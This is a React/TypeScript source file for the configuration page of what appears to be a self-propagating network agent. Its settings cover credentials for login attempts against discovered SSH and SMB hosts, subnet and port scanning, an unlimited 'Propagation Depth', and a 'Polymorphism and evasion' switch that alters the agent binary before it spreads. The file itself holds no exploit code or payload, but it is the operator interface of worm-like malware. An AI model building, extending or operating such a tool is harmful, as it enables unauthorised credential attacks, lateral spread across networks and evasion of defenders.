'use client';

import React, { useState, useEffect } from 'react';
import Box from '@mui/material/Box';
import Grid from '@mui/material/Unstable_Grid2';
import Card from '@mui/material/Card';
import CardContent from '@mui/material/CardContent';
import Typography from '@mui/material/Typography';
import Button from '@mui/material/Button';
import TextField from '@mui/material/TextField';
import Switch from '@mui/material/Switch';
import FormControlLabel from '@mui/material/FormControlLabel';
import Slider from '@mui/material/Slider';
import Accordion from '@mui/material/Accordion';
import AccordionSummary from '@mui/material/AccordionSummary';
import AccordionDetails from '@mui/material/AccordionDetails';
import Chip from '@mui/material/Chip';
import Divider from '@mui/material/Divider';
import Alert from '@mui/material/Alert';
import Snackbar from '@mui/material/Snackbar';
import IconButton from '@mui/material/IconButton';
import ExpandMoreIcon from '@mui/icons-material/ExpandMore';
import SaveIcon from '@mui/icons-material/Save';
import RestoreIcon from '@mui/icons-material/Restore';
import SecurityIcon from '@mui/icons-material/Security';
import NetworkCheckIcon from '@mui/icons-material/NetworkCheck';
import VpnKeyIcon from '@mui/icons-material/VpnKey';
import DevicesIcon from '@mui/icons-material/Devices';
import AddIcon from '@mui/icons-material/Add';
import DeleteIcon from '@mui/icons-material/Delete';
import { getConfig, saveConfig, resetConfig } from '@/lib/appState';

export default function ConfigurePage() {
    const [propagationDepth, setPropagationDepth] = useState<number>(2);
    const [tunnelTimeout, setTunnelTimeout] = useState<number>(30);
    const [scanNetwork, setScanNetwork] = useState(true);
    const [enablePolymorphism, setEnablePolymorphism] = useState(false);
    const [targetSubnets, setTargetSubnets] = useState('');
    const [blockedIPs, setBlockedIPs] = useState('');
    const [credentials, setCredentials] = useState<
        { username: string; password: string }[]
    >([]);
    const [enableSSH, setEnableSSH] = useState(true);
    const [enableSMB, setEnableSMB] = useState(true);
    const [enableRDP, setEnableRDP] = useState(true);
    const [newUser, setNewUser] = useState('');
    const [newPass, setNewPass] = useState('');
    const [snackbar, setSnackbar] = useState({ open: false, message: '' });

    useEffect(() => {
        const config = getConfig();
        setPropagationDepth(config.propagationDepth);
        setTunnelTimeout(config.tunnelTimeout);
        setScanNetwork(config.scanNetwork);
        setEnablePolymorphism(config.enablePolymorphism);
        setTargetSubnets(config.targetSubnets);
        setBlockedIPs(config.blockedIPs);
        setCredentials(config.credentials || []);
        setEnableSSH(config.enableSSH !== false);
        setEnableSMB(config.enableSMB !== false);
        setEnableRDP(config.enableRDP !== false);
    }, []);

    const handleSave = () => {
        saveConfig({
            propagationDepth,
            tunnelTimeout,
            scanNetwork,
            enablePolymorphism,
            targetSubnets,
            blockedIPs,
            credentials,
            enableSSH,
            enableSMB,
            enableRDP,
            scanPorts: [
                21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995,
                1433, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017
            ]
        });
        setSnackbar({
            open: true,
            message: 'Configuration saved successfully!'
        });
    };

    const handleReset = () => {
        const defaults = resetConfig();
        setPropagationDepth(defaults.propagationDepth);
        setTunnelTimeout(defaults.tunnelTimeout);
        setScanNetwork(defaults.scanNetwork);
        setEnablePolymorphism(defaults.enablePolymorphism);
        setTargetSubnets(defaults.targetSubnets);
        setBlockedIPs(defaults.blockedIPs);
        setCredentials([]);
        setEnableSSH(true);
        setEnableSMB(true);
        setEnableRDP(true);
        setSnackbar({
            open: true,
            message: 'Configuration reset to defaults.'
        });
    };

    const addCredential = () => {
        if (newUser && newPass) {
            setCredentials([
                ...credentials,
                { username: newUser, password: newPass }
            ]);
            setNewUser('');
            setNewPass('');
        }
    };

    const removeCredential = (index: number) => {
        setCredentials(credentials.filter((_, i) => i !== index));
    };

    return (
        <Box>
            <Box
                sx={{
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'center',
                    mb: 3
                }}>
                <Box>
                    <Typography variant="h4" sx={{ fontWeight: 800 }}>
                        Agent Configuration
                    </Typography>
                    <Typography
                        variant="body2"
                        sx={{ color: 'text.secondary', mt: 0.5 }}>
                        Configure credentials, protocols, and scan parameters
                        for real network testing
                    </Typography>
                </Box>
                <Box sx={{ display: 'flex', gap: 1.5 }}>
                    <Button
                        variant="outlined"
                        startIcon={<RestoreIcon />}
                        onClick={handleReset}
                        sx={{
                            borderColor: 'rgba(255, 255, 255, 0.2)',
                            color: 'text.secondary'
                        }}>
                        Reset
                    </Button>
                    <Button
                        variant="contained"
                        color="primary"
                        startIcon={<SaveIcon />}
                        onClick={handleSave}
                        sx={{ color: '#000', fontWeight: 700 }}>
                        Save
                    </Button>
                </Box>
            </Box>

            <Alert
                severity="info"
                sx={{ mb: 3, backgroundColor: 'rgba(64, 196, 255, 0.08)' }}>
                Add credentials below for SSH/SMB exploitation attempts. The
                scan will use these to try logging into discovered hosts.
            </Alert>

            <Grid container spacing={2.5}>
                <Grid xs={12} lg={8}>
                    {/* Credentials Section */}
                    <Accordion
                        defaultExpanded
                        sx={{ backgroundColor: 'background.paper', mb: 2 }}>
                        <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                            <Box
                                sx={{
                                    display: 'flex',
                                    alignItems: 'center',
                                    gap: 1.5
                                }}>
                                <VpnKeyIcon sx={{ color: '#FFB74D' }} />
                                <Box>
                                    <Typography
                                        variant="subtitle1"
                                        sx={{ fontWeight: 600 }}>
                                        Exploitation Credentials
                                    </Typography>
                                    <Typography
                                        variant="caption"
                                        sx={{ color: 'text.secondary' }}>
                                        Credentials for SSH, SMB, and other
                                        service login attempts
                                    </Typography>
                                </Box>
                            </Box>
                        </AccordionSummary>
                        <AccordionDetails>
                            <Alert severity="warning" sx={{ mb: 2 }}>
                                These credentials will be used to attempt real
                                authentication on discovered hosts. Add
                                common/known credentials for your test network.
                            </Alert>

                            {credentials.map((cred, i) => (
                                <Box
                                    key={i}
                                    sx={{
                                        display: 'flex',
                                        gap: 1,
                                        mb: 1,
                                        alignItems: 'center'
                                    }}>
                                    <Chip
                                        label={cred.username}
                                        size="small"
                                        sx={{ fontFamily: 'monospace' }}
                                    />
                                    <Chip
                                        label="********"
                                        size="small"
                                        variant="outlined"
                                    />
                                    <IconButton
                                        size="small"
                                        onClick={() => removeCredential(i)}>
                                        <DeleteIcon
                                            sx={{
                                                fontSize: 16,
                                                color: '#FF5252'
                                            }}
                                        />
                                    </IconButton>
                                </Box>
                            ))}

                            <Box sx={{ display: 'flex', gap: 1, mt: 2 }}>
                                <TextField
                                    size="small"
                                    placeholder="Username"
                                    value={newUser}
                                    onChange={(e) => setNewUser(e.target.value)}
                                    sx={{ flex: 1 }}
                                    InputProps={{
                                        sx: {
                                            backgroundColor:
                                                'rgba(255,255,255,0.03)'
                                        }
                                    }}
                                />
                                <TextField
                                    size="small"
                                    placeholder="Password"
                                    type="password"
                                    value={newPass}
                                    onChange={(e) => setNewPass(e.target.value)}
                                    sx={{ flex: 1 }}
                                    InputProps={{
                                        sx: {
                                            backgroundColor:
                                                'rgba(255,255,255,0.03)'
                                        }
                                    }}
                                />
                                <Button
                                    variant="outlined"
                                    startIcon={<AddIcon />}
                                    onClick={addCredential}
                                    sx={{
                                        borderColor: '#FFB74D',
                                        color: '#FFB74D'
                                    }}>
                                    Add
                                </Button>
                            </Box>
                        </AccordionDetails>
                    </Accordion>

                    {/* Exploitation Protocols */}
                    <Accordion
                        defaultExpanded
                        sx={{ backgroundColor: 'background.paper', mb: 2 }}>
                        <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                            <Box
                                sx={{
                                    display: 'flex',
                                    alignItems: 'center',
                                    gap: 1.5
                                }}>
                                <SecurityIcon sx={{ color: '#7C4DFF' }} />
                                <Box>
                                    <Typography
                                        variant="subtitle1"
                                        sx={{ fontWeight: 600 }}>
                                        Exploitation Protocols
                                    </Typography>
                                    <Typography
                                        variant="caption"
                                        sx={{ color: 'text.secondary' }}>
                                        Choose which services to attempt
                                        exploitation on
                                    </Typography>
                                </Box>
                            </Box>
                        </AccordionSummary>
                        <AccordionDetails>
                            <FormControlLabel
                                control={
                                    <Switch
                                        checked={enableSSH}
                                        onChange={(e) =>
                                            setEnableSSH(e.target.checked)
                                        }
                                        color="primary"
                                    />
                                }
                                label="SSH (port 22) - Attempt credential-based SSH login"
                            />
                            <FormControlLabel
                                control={
                                    <Switch
                                        checked={enableSMB}
                                        onChange={(e) =>
                                            setEnableSMB(e.target.checked)
                                        }
                                        color="primary"
                                    />
                                }
                                label="SMB (port 445) - Attempt Windows file share access"
                            />
                            <FormControlLabel
                                control={
                                    <Switch
                                        checked={enableRDP}
                                        onChange={(e) =>
                                            setEnableRDP(e.target.checked)
                                        }
                                        color="primary"
                                    />
                                }
                                label="RDP (port 3389) - Detect Remote Desktop availability"
                            />
                        </AccordionDetails>
                    </Accordion>

                    {/* Network Config */}
                    <Accordion
                        defaultExpanded
                        sx={{ backgroundColor: 'background.paper', mb: 2 }}>
                        <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                            <Box
                                sx={{
                                    display: 'flex',
                                    alignItems: 'center',
                                    gap: 1.5
                                }}>
                                <NetworkCheckIcon
                                    sx={{ color: 'primary.main' }}
                                />
                                <Box>
                                    <Typography
                                        variant="subtitle1"
                                        sx={{ fontWeight: 600 }}>
                                        Network Scanning
                                    </Typography>
                                    <Typography
                                        variant="caption"
                                        sx={{ color: 'text.secondary' }}>
                                        Control network discovery and
                                        propagation settings
                                    </Typography>
                                </Box>
                            </Box>
                        </AccordionSummary>
                        <AccordionDetails>
                            <Grid container spacing={3}>
                                <Grid xs={12} sm={6}>
                                    <Typography
                                        variant="body2"
                                        sx={{ mb: 1, fontWeight: 500 }}>
                                        Propagation Depth
                                    </Typography>
                                    <Slider
                                        value={propagationDepth}
                                        onChange={(_, val) =>
                                            setPropagationDepth(val as number)
                                        }
                                        min={0}
                                        max={10}
                                        marks
                                        valueLabelDisplay="on"
                                        sx={{ color: 'primary.main' }}
                                    />
                                    <Typography
                                        variant="caption"
                                        sx={{ color: 'text.secondary' }}>
                                        Maximum hops from initial machine (0 =
                                        unlimited)
                                    </Typography>
                                </Grid>
                                <Grid xs={12} sm={6}>
                                    <Typography
                                        variant="body2"
                                        sx={{ mb: 1, fontWeight: 500 }}>
                                        Tunnel Timeout (sec)
                                    </Typography>
                                    <TextField
                                        type="number"
                                        value={tunnelTimeout}
                                        onChange={(e) =>
                                            setTunnelTimeout(
                                                Number(e.target.value)
                                            )
                                        }
                                        size="small"
                                        fullWidth
                                        InputProps={{
                                            sx: {
                                                backgroundColor:
                                                    'rgba(255,255,255,0.03)'
                                            }
                                        }}
                                    />
                                </Grid>
                                <Grid xs={12}>
                                    <FormControlLabel
                                        control={
                                            <Switch
                                                checked={scanNetwork}
                                                onChange={(e) =>
                                                    setScanNetwork(
                                                        e.target.checked
                                                    )
                                                }
                                                color="primary"
                                            />
                                        }
                                        label="Auto-detect and scan local subnets"
                                    />
                                </Grid>
                            </Grid>
                        </AccordionDetails>
                    </Accordion>

                    {/* Target Config */}
                    <Accordion
                        sx={{ backgroundColor: 'background.paper', mb: 2 }}>
                        <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                            <Box
                                sx={{
                                    display: 'flex',
                                    alignItems: 'center',
                                    gap: 1.5
                                }}>
                                <DevicesIcon sx={{ color: '#40C4FF' }} />
                                <Box>
                                    <Typography
                                        variant="subtitle1"
                                        sx={{ fontWeight: 600 }}>
                                        Target Configuration
                                    </Typography>
                                    <Typography
                                        variant="caption"
                                        sx={{ color: 'text.secondary' }}>
                                        Specify target subnets and exclusions
                                    </Typography>
                                </Box>
                            </Box>
                        </AccordionSummary>
                        <AccordionDetails>
                            <Grid container spacing={3}>
                                <Grid xs={12} sm={6}>
                                    <TextField
                                        label="Target Subnets"
                                        placeholder="e.g. 192.168.1"
                                        value={targetSubnets}
                                        onChange={(e) =>
                                            setTargetSubnets(e.target.value)
                                        }
                                        multiline
                                        rows={3}
                                        fullWidth
                                        size="small"
                                        helperText="Subnet prefix to scan (e.g. 192.168.1)"
                                        InputProps={{
                                            sx: {
                                                backgroundColor:
                                                    'rgba(255,255,255,0.03)'
                                            }
                                        }}
                                    />
                                </Grid>
                                <Grid xs={12} sm={6}>
                                    <TextField
                                        label="Blocked IPs"
                                        placeholder="e.g. 192.168.1.1"
                                        value={blockedIPs}
                                        onChange={(e) =>
                                            setBlockedIPs(e.target.value)
                                        }
                                        multiline
                                        rows={3}
                                        fullWidth
                                        size="small"
                                        helperText="IPs to exclude from scanning"
                                        InputProps={{
                                            sx: {
                                                backgroundColor:
                                                    'rgba(255,255,255,0.03)'
                                            }
                                        }}
                                    />
                                </Grid>
                            </Grid>
                        </AccordionDetails>
                    </Accordion>

                    {/* Advanced Options */}
                    <Accordion
                        sx={{ backgroundColor: 'background.paper', mb: 2 }}>
                        <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                            <Box
                                sx={{
                                    display: 'flex',
                                    alignItems: 'center',
                                    gap: 1.5
                                }}>
                                <SecurityIcon sx={{ color: '#7C4DFF' }} />
                                <Box>
                                    <Typography
                                        variant="subtitle1"
                                        sx={{ fontWeight: 600 }}>
                                        Advanced Options
                                    </Typography>
                                    <Typography
                                        variant="caption"
                                        sx={{ color: 'text.secondary' }}>
                                        Polymorphism and evasion
                                    </Typography>
                                </Box>
                            </Box>
                        </AccordionSummary>
                        <AccordionDetails>
                            <FormControlLabel
                                control={
                                    <Switch
                                        checked={enablePolymorphism}
                                        onChange={(e) =>
                                            setEnablePolymorphism(
                                                e.target.checked
                                            )
                                        }
                                        color="secondary"
                                    />
                                }
                                label="Enable Polymorphism (modify agent binary before propagation)"
                            />
                        </AccordionDetails>
                    </Accordion>
                </Grid>

                <Grid xs={12} lg={4}>
                    <Card sx={{ mb: 2.5 }}>
                        <CardContent sx={{ p: 2.5 }}>
                            <Typography variant="h6" sx={{ mb: 2 }}>
                                Configuration Summary
                            </Typography>
                            {[
                                {
                                    label: 'Propagation Depth',
                                    value: propagationDepth
                                },
                                {
                                    label: 'Credentials',
                                    value: `${credentials.length} configured`
                                },
                                {
                                    label: 'SSH Exploit',
                                    value: enableSSH ? 'Enabled' : 'Disabled'
                                },
                                {
                                    label: 'SMB Exploit',
                                    value: enableSMB ? 'Enabled' : 'Disabled'
                                },
                                {
                                    label: 'RDP Detection',
                                    value: enableRDP ? 'Enabled' : 'Disabled'
                                },
                                {
                                    label: 'Auto-Scan',
                                    value: scanNetwork ? 'Enabled' : 'Disabled'
                                },
                                {
                                    label: 'Target',
                                    value: targetSubnets || 'Auto-detect'
                                }
                            ].map((item) => (
                                <React.Fragment key={item.label}>
                                    <Box
                                        sx={{
                                            display: 'flex',
                                            justifyContent: 'space-between',
                                            py: 0.5
                                        }}>
                                        <Typography
                                            variant="body2"
                                            sx={{ color: 'text.secondary' }}>
                                            {item.label}
                                        </Typography>
                                        <Typography
                                            variant="body2"
                                            sx={{ fontWeight: 600 }}>
                                            {item.value}
                                        </Typography>
                                    </Box>
                                    <Divider sx={{ my: 0.5 }} />
                                </React.Fragment>
                            ))}
                        </CardContent>
                    </Card>

                    <Card>
                        <CardContent sx={{ p: 2.5 }}>
                            <Typography variant="h6" sx={{ mb: 1 }}>
                                Scanned Ports
                            </Typography>
                            <Typography
                                variant="caption"
                                sx={{
                                    color: 'text.secondary',
                                    display: 'block',
                                    mb: 1
                                }}>
                                23 common ports are scanned by default
                            </Typography>
                            <Box
                                sx={{
                                    display: 'flex',
                                    flexWrap: 'wrap',
                                    gap: 0.5
                                }}>
                                {[
                                    21, 22, 23, 25, 53, 80, 110, 135, 139, 143,
                                    443, 445, 993, 995, 1433, 3306, 3389, 5432,
                                    5900, 6379, 8080, 8443, 27017
                                ].map((port) => (
                                    <Chip
                                        key={port}
                                        label={port}
                                        size="small"
                                        variant="outlined"
                                        sx={{ fontSize: '0.65rem', height: 20 }}
                                    />
                                ))}
                            </Box>
                        </CardContent>
                    </Card>
                </Grid>
            </Grid>

            <Snackbar
                open={snackbar.open}
                autoHideDuration={3000}
                onClose={() => setSnackbar({ ...snackbar, open: false })}
                message={snackbar.message}
            />
        </Box>
    );
}
